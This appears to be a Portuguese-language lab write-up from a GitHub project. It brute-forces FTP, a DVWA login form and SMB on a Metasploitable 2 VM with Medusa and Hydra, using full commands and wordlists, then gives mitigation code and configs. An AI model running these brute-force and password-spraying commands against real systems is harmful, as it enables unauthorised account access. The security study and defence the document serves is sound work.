# Kali_Linux_Test

# 🔐 Simulação de Ataque de Força Bruta com Medusa e Kali Linux

## 📋 Sumário
- [Sobre o Projeto](#sobre-o-projeto)
- [Objetivos](#objetivos)
- [Ambiente de Laboratório](#ambiente-de-laboratório)
- [Configuração Inicial](#configuração-inicial)
- [Cenário 1: Ataque FTP](#cenário-1-ataque-ftp)
- [Cenário 2: Ataque Web (DVWA)](#cenário-2-ataque-web-dvwa)
- [Cenário 3: Password Spraying SMB](#cenário-3-password-spraying-smb)
- [Medidas de Mitigação](#medidas-de-mitigação)
- [Conclusões](#conclusões)
- [Referências](#referências)

---

## 📖 Sobre o Projeto

Este projeto documenta a execução de testes de penetração em ambiente controlado, utilizando o Kali Linux e a ferramenta Medusa para simular ataques de força bruta em diferentes serviços. O objetivo é compreender vulnerabilidades comuns e implementar medidas de proteção adequadas.

⚠️ **AVISO IMPORTANTE**: Todos os testes foram realizados em ambiente isolado e controlado. A execução de ataques em sistemas sem autorização é crime previsto em lei.

---

## 🎯 Objetivos

- Compreender o funcionamento de ataques de força bruta
- Utilizar o Medusa para auditoria de segurança
- Identificar vulnerabilidades em serviços comuns (FTP, Web, SMB)
- Documentar processos técnicos de forma clara
- Propor medidas de mitigação e boas práticas de segurança

---

## 🖥️ Ambiente de Laboratório

### Especificações do Ambiente

| Componente | Descrição | IP |
|------------|-----------|-----|
| **VM 1** | Kali Linux 2024.x | 192.168.56.101 |
| **VM 2** | Metasploitable 2 | 192.168.56.102 |
| **Rede** | Host-Only (VirtualBox) | 192.168.56.0/24 |
| **Ferramenta Principal** | Medusa 2.2 | - |

### Pré-requisitos

- VirtualBox instalado
- Kali Linux (ISO disponível em kali.org)
- Metasploitable 2 (disponível em SourceForge)
- Conhecimentos básicos de Linux e redes
- DVWA instalado no Metasploitable (opcional)

---

## ⚙️ Configuração Inicial

### 1. Configuração das VMs no VirtualBox

```bash
# No VirtualBox, configure a rede Host-Only para ambas as VMs
# VirtualBox > File > Host Network Manager
# Criar rede: vboxnet0 com IP 192.168.56.1
```

### 2. Verificação de Conectividade

```bash
# No Kali Linux
ping 192.168.56.102

# Verificar serviços disponíveis no alvo
nmap -sV 192.168.56.102
```

**Resultado Esperado do Nmap:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
```

### 3. Criação de Wordlists

```bash
# Wordlist de usuários (users.txt)
cat > users.txt << EOF
admin
root
user
msfadmin
postgres
service
EOF

# Wordlist de senhas (passwords.txt)
cat > passwords.txt << EOF
admin
password
123456
msfadmin
root
toor
service
postgres
EOF
```

---

## 🎯 Cenário 1: Ataque FTP

### Objetivo
Realizar ataque de força bruta no serviço FTP do Metasploitable 2.

### Comandos Utilizados

```bash
# Ataque básico com Medusa
medusa -h 192.168.56.102 -u msfadmin -P passwords.txt -M ftp

# Ataque com lista de usuários
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 4

# Ataque mais agressivo (ajustar threads)
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp -t 10 -v 6
```

### Parâmetros Explicados

- `-h`: Host alvo
- `-u`: Usuário específico
- `-U`: Arquivo com lista de usuários
- `-P`: Arquivo com lista de senhas
- `-M`: Módulo a ser utilizado (ftp)
- `-t`: Número de threads paralelas
- `-v`: Nível de verbosidade (0-6)

### Resultados Obtidos

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do Acesso

```bash
# Conectar via FTP para validar
ftp 192.168.56.102
# Username: msfadmin
# Password: msfadmin

# Listar arquivos
ls -la
```

## 🌐 Cenário 2: Ataque Web (DVWA)

### Objetivo
Realizar ataque de força bruta em formulário de login web.

### Preparação do DVWA

```bash
# Acessar DVWA no navegador
http://192.168.56.102/dvwa

# Configurar nível de segurança para "Low"
# DVWA Security > Security Level: Low
```

### Análise do Formulário

```bash
# Capturar requisição com Burp Suite ou inspecionar elemento
# Identificar parâmetros:
# - username
# - password
# - Login=Login
```

### Comando Medusa para Web

```bash
# Ataque no formulário web
medusa -h 192.168.56.102 -u admin -P passwords.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Login failed"
```

### Alternativa: Hydra

```bash
# Hydra pode ser mais eficiente para ataques web
hydra -l admin -P passwords.txt 192.168.56.102 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

### Resultados

```
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

---

## 🗂️ Cenário 3: Password Spraying SMB

### Objetivo
Enumerar usuários e realizar password spraying no serviço SMB.

### Enumeração de Usuários

```bash
# Enumerar usuários SMB com enum4linux
enum4linux -U 192.168.56.102

# Ou usar nmap
nmap --script smb-enum-users.nse -p445 192.168.56.102
```

### Usuários Encontrados
```
user:[msfadmin] rid:[0x3ea]
user:[postgres] rid:[0x3ec]
user:[user] rid:[0x3f0]
user:[service] rid:[0x3f2]
```

### Password Spraying

```bash
# Criar lista com senha comum
echo "password123" > spray.txt

# Testar mesma senha em múltiplos usuários
medusa -h 192.168.56.102 -U users.txt -p password123 -M smbnt

# Ou com lista pequena de senhas
medusa -h 192.168.56.102 -U users.txt -P spray.txt -M smbnt -t 1 -e ns
```

### Validação

```bash
# Testar acesso SMB encontrado
smbclient -L 192.168.56.102 -U msfadmin
# Password: msfadmin

# Acessar compartilhamento
smbclient //192.168.56.102/tmp -U msfadmin
```

---

## 🛡️ Medidas de Mitigação

### 1. Políticas de Senha Forte

```php
// Exemplo de validação em PHP (Laravel)
// app/Http/Requests/PasswordRequest.php

<?php

namespace App\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;

class PasswordRequest extends FormRequest
{
    public function rules()
    {
        return [
            'password' => [
                'required',
                'min:12',
                'regex:/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/',
                'confirmed'
            ],
        ];
    }

    public function messages()
    {
        return [
            'password.regex' => 'A senha deve conter pelo menos uma letra maiúscula, uma minúscula, um número e um caractere especial.',
        ];
    }
}
```

### 2. Rate Limiting

```php
// Laravel - Throttle de tentativas de login
// app/Http/Controllers/Auth/LoginController.php

use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Validation\ValidationException;

public function login(Request $request)
{
    $throttleKey = strtolower($request->input('email')) . '|' . $request->ip();
    
    if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
        $seconds = RateLimiter::availableIn($throttleKey);
        
        throw ValidationException::withMessages([
            'email' => ['Muitas tentativas. Tente novamente em ' . $seconds . ' segundos.'],
        ]);
    }
    
    if ($this->attemptLogin($request)) {
        RateLimiter::clear($throttleKey);
        return $this->sendLoginResponse($request);
    }
    
    RateLimiter::hit($throttleKey, 60);
    
    return $this->sendFailedLoginResponse($request);
}
```

### 3. Fail2Ban (Servidor Linux)

```bash
# Instalar Fail2Ban
sudo apt-get install fail2ban

# Configurar jail para FTP
sudo nano /etc/fail2ban/jail.local
```

```ini
[vsftpd]
enabled = true
port = ftp,ftp-data,ftps,ftps-data
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
findtime = 600
```

### 4. Autenticação Multi-Fator (2FA)

```php
// Laravel - Exemplo com Google2FA
// app/Http/Controllers/Auth/TwoFactorController.php

use PragmaRX\Google2FA\Google2FA;

public function verify(Request $request)
{
    $google2fa = new Google2FA();
    
    $secret = $request->user()->google2fa_secret;
    $valid = $google2fa->verifyKey($secret, $request->input('one_time_password'));
    
    if ($valid) {
        session(['2fa_verified' => true]);
        return redirect()->intended('dashboard');
    }
    
    return back()->withErrors(['one_time_password' => 'Código inválido']);
}
```

### 5. Monitoramento e Logging

```php
// Laravel - Log de tentativas de login
// app/Listeners/LogLoginAttempt.php

<?php

namespace App\Listeners;

use Illuminate\Auth\Events\Failed;
use Illuminate\Support\Facades\Log;

class LogLoginAttempt
{
    public function handle(Failed $event)
    {
        Log::warning('Login falhou', [
            'email' => $event->credentials['email'] ?? 'N/A',
            'ip' => request()->ip(),
            'user_agent' => request()->userAgent(),
            'timestamp' => now()
        ]);
    }
}
```

### 6. CAPTCHA após Falhas

```javascript
// Exemplo com reCAPTCHA v3 (JavaScript/jQuery)

$(document).ready(function() {
    let loginAttempts = 0;
    
    $('#loginForm').on('submit', function(e) {
        loginAttempts++;
        
        if (loginAttempts >= 3) {
            e.preventDefault();
            
            grecaptcha.ready(function() {
                grecaptcha.execute('YOUR_SITE_KEY', {action: 'login'})
                    .then(function(token) {
                        $('#recaptchaToken').val(token);
                        $('#loginForm').off('submit').submit();
                    });
            });
        }
    });
});
```

### 7. Configurações de Servidor

```bash
# SSH - Desabilitar login root
sudo nano /etc/ssh/sshd_config
```

```
PermitRootLogin no
MaxAuthTries 3
PasswordAuthentication yes
PubkeyAuthentication yes
```

```bash
# FTP - vsftpd.conf
sudo nano /etc/vsftpd.conf
```

```
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES
max_login_fails=3
delay_failed_login=5
```

---

## 💡 Conclusões

### Aprendizados Principais

1. **Vulnerabilidade de Senhas Fracas**: Senhas simples como "password", "admin" e "123456" foram quebradas em segundos.

2. **Importância do Rate Limiting**: Sem limitação de tentativas, um atacante pode testar milhares de combinações rapidamente.

3. **Necessidade de Monitoramento**: Logs adequados são essenciais para detectar tentativas de invasão.

4. **Múltiplas Camadas de Segurança**: A combinação de diferentes medidas (senhas fortes + 2FA + rate limiting + monitoramento) é mais eficaz que qualquer medida isolada.

### Boas Práticas Recomendadas

✅ Implementar política de senhas fortes (mínimo 12 caracteres, complexidade)  
✅ Ativar autenticação multi-fator (2FA/MFA)  
✅ Configurar rate limiting e bloqueio temporário  
✅ Monitorar logs de autenticação continuamente  
✅ Manter sistemas e serviços atualizados  
✅ Desabilitar serviços desnecessários  
✅ Usar certificados SSL/TLS para criptografia  
✅ Implementar CAPTCHA após múltiplas falhas  
✅ Realizar auditorias de segurança regularmente  
✅ Treinar usuários sobre segurança da informação  

### Reflexões Finais

Este projeto demonstrou na prática como ataques de força bruta funcionam e evidenciou a importância de implementar múltiplas camadas de segurança. Em ambientes de produção, a combinação de todas as medidas de mitigação apresentadas é essencial para proteger adequadamente sistemas e dados.

A experiência prática com ferramentas como Medusa, Nmap e enum4linux proporciona uma compreensão profunda das vulnerabilidades, permitindo desenvolver soluções mais seguras e resilientes.

---

## 📚 Referências

### Documentação Oficial
- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Medusa - Parallel Network Login Auditor](http://foofus.net/goons/jmk/medusa/medusa.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA Documentation](https://github.com/digininja/DVWA)

### Ferramentas Utilizadas
- Medusa 2.2
- Nmap 7.94
- enum4linux
- Metasploitable 2
- VirtualBox

### Materiais de Estudo
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/)
- [CIS Security Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [Laravel Security Best Practices](https://laravel.com/docs/security)

### Leis e Regulamentações
- Lei Geral de Proteção de Dados (LGPD) - Lei nº 13.709/2018
- Marco Civil da Internet - Lei nº 12.965/2014
- Lei de Crimes Cibernéticos - Lei nº 12.737/2012
